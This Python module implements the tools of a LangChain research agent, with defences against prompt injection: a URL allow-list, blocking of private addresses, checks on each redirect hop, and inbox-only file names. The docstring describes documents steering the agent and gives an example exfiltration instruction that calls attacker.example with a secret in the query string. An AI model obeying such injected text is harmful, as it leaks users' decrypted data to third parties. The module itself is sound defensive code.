"""Agent tool implementations, independent of LangChain.

Everything here is plain async Python with its dependencies injected (ToolDeps), so the behaviour
and the safety checks are unit-testable without an LLM or LangChain installed. tools/__init__.py
wraps these as LangChain tools.

Safety rules enforced here (the agent's inputs can be steered by text inside retrieved documents,
i.e. prompt injection, so tool arguments are treated as untrusted):

* summarize_url fetches only http(s) URLs that the operator typed in the query or that came back
  from the Scholar search, and never private/loopback/link-local addresses. Otherwise a
  document could tell the model to "summarize https://attacker.example/?data=<secret>" and
  leak decrypted content to a third party, or reach internal services (SSRF).
  Redirects are not followed automatically: fetch_html_checked() follows each one by hand and
  applies the same check to every hop, so an allowed public page cannot bounce the request to
  http://127.0.0.1 or to a host that is not on the allow-list.
* ingest_pdf reads only plain file names inside INGEST_INBOX_DIR: no paths, no symlinks out.
* search_mcp is not offered when encryption is enabled: it would send the query in plaintext to
  Atomic, which the encrypted design promises never to do (see select_tool_names()).
"""

from __future__ import annotations

import asyncio
import ipaddress
import json
import os
import re
import socket
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, Iterable, List, Optional, Sequence, Set
from urllib.parse import urljoin, urlparse

RESULT_PREVIEW_CHARS = 200
KNOWLEDGE_TEXT_CHARS = 800
INGEST_EXTENSIONS = (".pdf", ".txt", ".md")

REDIRECT_STATUSES = (301, 302, 303, 307, 308)
MAX_REDIRECTS = 5
FETCH_TIMEOUT_S = 8
FETCH_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}


class FetchRefused(Exception):
    """A URL or one of its redirect hops failed the fetch policy. Not cached, not retried."""

_URL_RE = re.compile(r"https?://[^\s<>\"'()\[\]{}]+", re.IGNORECASE)


@dataclass
class ToolDeps:
    """What the tools need from the app. main.py builds one per request."""

    actor: str
    mcp_call: Callable[[str, dict], Awaitable[Any]]
    # summarize(url, title, fetch): `fetch(url) -> html` is supplied by the tool and enforces the policy.
    summarize: Callable[[str, str, Callable[[str], Awaitable[str]]], Awaitable[dict]]
    ingest_bytes: Callable[[str, bytes, str], Awaitable[dict]]
    pipeline: Any = None                       # SecurePipeline or None
    allowed_urls: Set[str] = field(default_factory=set)
    inbox_dir: str = "./data/inbox"
    max_upload_bytes: int = 25 * 1024 * 1024
    resolve_host: Optional[Callable[[str], Awaitable[List[str]]]] = None  # injectable for tests
    http_get: Optional[Callable[..., Any]] = None  # requests.get-compatible; injectable for tests


# ----------------------------------------------------------------------------- tool selection
def select_tool_names(encrypted_mode: bool) -> List[str]:
    """Which tools the agent gets. Order is the order shown to the model."""
    if encrypted_mode:
        # No search_mcp and no get_wiki_tool: both would send the query/topic to Atomic in plaintext.
        return ["search_knowledge", "summarize_url", "ingest_pdf", "generate_word_report_tool"]
    return ["search_mcp", "get_wiki_tool", "summarize_url", "ingest_pdf", "generate_word_report_tool"]


# ----------------------------------------------------------------------------- URL policy
def urls_in_text(text: str) -> Set[str]:
    return {u.rstrip(".,;:!?") for u in _URL_RE.findall(text or "")}


def _normalise_url(url: str) -> str:
    return (url or "").strip().rstrip("/")


def _ip_is_internal(ip: str) -> bool:
    addr = ipaddress.ip_address(ip.split("%", 1)[0])
    return (addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved
            or addr.is_multicast or addr.is_unspecified)


async def _default_resolve(host: str) -> List[str]:
    infos = await asyncio.to_thread(socket.getaddrinfo, host, None)
    return sorted({i[4][0] for i in infos})


async def check_url_allowed(url: str, allowed: Iterable[str],
                            resolve: Optional[Callable[[str], Awaitable[List[str]]]] = None) -> Optional[str]:
    """Return None if the URL may be fetched, else a short reason."""
    parsed = urlparse((url or "").strip())
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        return "only http(s) URLs are allowed"
    if parsed.username or parsed.password:
        return "URLs with credentials are not allowed"
    if _normalise_url(url) not in {_normalise_url(a) for a in allowed}:
        return ("URL was not provided by the operator or returned by the paper search; "
                "ask the operator to paste the link")
    host = parsed.hostname
    if host == "localhost" or host.endswith(".localhost") or host.endswith(".local"):
        return "internal hosts are not allowed"
    try:
        ips = [str(ipaddress.ip_address(host))]
    except ValueError:
        try:
            ips = await (resolve or _default_resolve)(host)
        except Exception:
            return "host could not be resolved"
    if not ips or any(_ip_is_internal(ip) for ip in ips):
        return "internal or private addresses are not allowed"
    return None


def _default_http_get(url: str, **kwargs: Any) -> Any:
    import requests

    return requests.get(url, **kwargs)


async def fetch_html_checked(url: str, allowed: Iterable[str],
                             resolve: Optional[Callable[[str], Awaitable[List[str]]]] = None,
                             http_get: Optional[Callable[..., Any]] = None,
                             max_redirects: int = MAX_REDIRECTS) -> str:
    """GET `url` with redirects followed by hand, checking every hop with check_url_allowed().

    Raises FetchRefused if any hop is not on the allow-list, resolves to a private/loopback/
    link-local address, or the chain exceeds max_redirects. Non-200 final responses raise a plain
    Exception (the caller treats that as "preview unavailable", as before).
    """
    get = http_get or _default_http_get
    allowed = set(allowed)
    current = (url or "").strip()
    for hop in range(max_redirects + 1):
        reason = await check_url_allowed(current, allowed, resolve)
        if reason:
            raise FetchRefused(f"hop {hop} ({current}): {reason}")
        resp = await asyncio.to_thread(get, current, headers=FETCH_HEADERS, timeout=FETCH_TIMEOUT_S,
                                       allow_redirects=False)
        try:
            status = resp.status_code
            if status in REDIRECT_STATUSES:
                location = resp.headers.get("Location") or resp.headers.get("location")
                if not location:
                    raise Exception(f"HTTP {status} without a Location header")
                current = urljoin(current, location)  # relative redirects resolve against this hop
                continue
            if status != 200:
                raise Exception(f"HTTP {status}")
            return resp.text
        finally:
            close = getattr(resp, "close", None)
            if close:
                close()
    raise FetchRefused(f"more than {max_redirects} redirects")


# ----------------------------------------------------------------------------- inbox policy
def resolve_inbox_file(inbox_dir: str, filename: str) -> str:
    """Map a bare file name to a real file inside inbox_dir, or raise ValueError."""
    name = (filename or "").strip()
    if not name or name != os.path.basename(name) or name in (".", "..") or "\x00" in name:
        raise ValueError("give a plain file name from the ingest inbox, not a path")
    if not name.lower().endswith(INGEST_EXTENSIONS):
        raise ValueError(f"only {', '.join(INGEST_EXTENSIONS)} files can be ingested")
    root = os.path.realpath(inbox_dir)
    path = os.path.realpath(os.path.join(root, name))
    if os.path.dirname(path) != root:
        raise ValueError("file is outside the ingest inbox")
    if not os.path.isfile(path):
        raise FileNotFoundError(name)
    return path


def list_inbox(inbox_dir: str, limit: int = 20) -> List[str]:
    try:
        names = sorted(n for n in os.listdir(inbox_dir)
                       if n.lower().endswith(INGEST_EXTENSIONS) and os.path.isfile(os.path.join(inbox_dir, n)))
    except OSError:
        return []
    return names[:limit]


# ----------------------------------------------------------------------------- implementations
async def search_knowledge_impl(deps: ToolDeps, query: str) -> str:
    if deps.pipeline is None:
        return json.dumps({"error": "encrypted knowledge base is not enabled"})
    try:
        res = await deps.pipeline.search(query, actor=deps.actor)
    except Exception as e:  # never echo internals beyond the exception type
        return json.dumps({"error": f"encrypted search failed: {type(e).__name__}"})
    return json.dumps([
        {"atom_id": r.get("atom_id"), "title": r.get("title"), "page": r.get("page"),
         "score": r.get("score"), "text": (r.get("text") or r.get("preview") or "")[:KNOWLEDGE_TEXT_CHARS]}
        for r in res.get("results", [])
    ])


async def search_mcp_impl(deps: ToolDeps, query: str) -> str:
    return json.dumps(await deps.mcp_call("semantic_search", {"query": query}))


async def get_wiki_impl(deps: ToolDeps, tag: str) -> str:
    return json.dumps(await deps.mcp_call("get_wiki", {"tag": tag}))


async def summarize_url_impl(deps: ToolDeps, url: str, title: str = "") -> str:
    url = (url or "").strip()
    # Up-front check (also covers cache hits, which never reach fetch()).
    reason = await check_url_allowed(url, deps.allowed_urls, deps.resolve_host)
    if reason:
        return json.dumps({"error": f"refused to fetch {url!r}: {reason}"})

    async def fetch(target: str) -> str:
        return await fetch_html_checked(target, deps.allowed_urls, deps.resolve_host, deps.http_get)

    try:
        res = await deps.summarize(url, title or url, fetch)
    except FetchRefused as e:
        return json.dumps({"error": f"refused to fetch {url!r}: {e}"})
    return json.dumps({k: res.get(k) for k in ("title", "source_domain", "status", "short_summary", "full_summary")})


async def ingest_pdf_impl(deps: ToolDeps, filename: str) -> str:
    try:
        path = resolve_inbox_file(deps.inbox_dir, filename)
    except FileNotFoundError:
        return json.dumps({"error": f"{filename!r} is not in the ingest inbox",
                           "available": list_inbox(deps.inbox_dir)})
    except ValueError as e:
        return json.dumps({"error": str(e), "available": list_inbox(deps.inbox_dir)})
    size = os.path.getsize(path)
    if size > deps.max_upload_bytes:
        return json.dumps({"error": f"file is {size} bytes, over the {deps.max_upload_bytes} byte limit"})
    with open(path, "rb") as f:
        data = f.read()
    try:
        res = await deps.ingest_bytes(os.path.basename(path), data, deps.actor)
    except Exception as e:
        return json.dumps({"error": f"ingestion failed: {type(e).__name__}: {e}"})
    keep = ("status", "atom_id", "doc_id", "chunks", "message", "error", "atomic_error")
    return json.dumps({k: res[k] for k in keep if k in res})


def write_word_report(executive_summary: str, math_output: str, directory: Optional[str] = None) -> str:
    """Body of generate_word_report_tool (unchanged behaviour, moved out of main.py)."""
    try:
        import docx
        from docx.enum.text import WD_ALIGN_PARAGRAPH

        doc = docx.Document()
        title = doc.add_heading('Sovereign Industrial Agent Report', 0)
        title.alignment = WD_ALIGN_PARAGRAPH.CENTER
        doc.add_heading('Executive Summary', level=1)
        doc.add_paragraph(executive_summary)
        doc.add_heading('Verified Calculation & Sandbox Output', level=1)
        math_para = doc.add_paragraph()
        math_run = math_para.add_run(math_output)
        math_run.font.name = 'Courier New'
        filepath = os.path.join(directory or os.getcwd(), 'sandbox_report.docx')
        doc.save(filepath)
        return f"Successfully generated Word document saved directly to disk at: {filepath}"
    except Exception as e:
        return f"Failed to generate Word document: {str(e)}. (Ensure python-docx is installed)"


# ----------------------------------------------------------------------------- trace
def _preview(content: Any) -> str:
    text = content if isinstance(content, str) else json.dumps(content, default=str)
    return text if len(text) <= RESULT_PREVIEW_CHARS else text[:RESULT_PREVIEW_CHARS] + "..."


def extract_tool_calls(messages: Sequence[Any]) -> List[Dict[str, Any]]:
    """Pair each tool call the model made with the tool's result.

    Works on LangChain message objects by duck typing: AIMessage.tool_calls is a list of
    {"name", "args", "id"}; ToolMessage has tool_call_id, name, content and (newer) status.
    """
    calls: List[Dict[str, Any]] = []
    by_id: Dict[str, Dict[str, Any]] = {}
    for msg in messages:
        for tc in getattr(msg, "tool_calls", None) or []:
            entry = {"name": tc.get("name"), "args": tc.get("args", {}), "id": tc.get("id"),
                     "status": "no_result", "result_preview": None}
            calls.append(entry)
            if tc.get("id"):
                by_id[tc["id"]] = entry
        call_id = getattr(msg, "tool_call_id", None)
        if call_id and call_id in by_id:
            entry = by_id[call_id]
            entry["status"] = getattr(msg, "status", None) or "success"
            entry["result_preview"] = _preview(getattr(msg, "content", ""))
    return calls
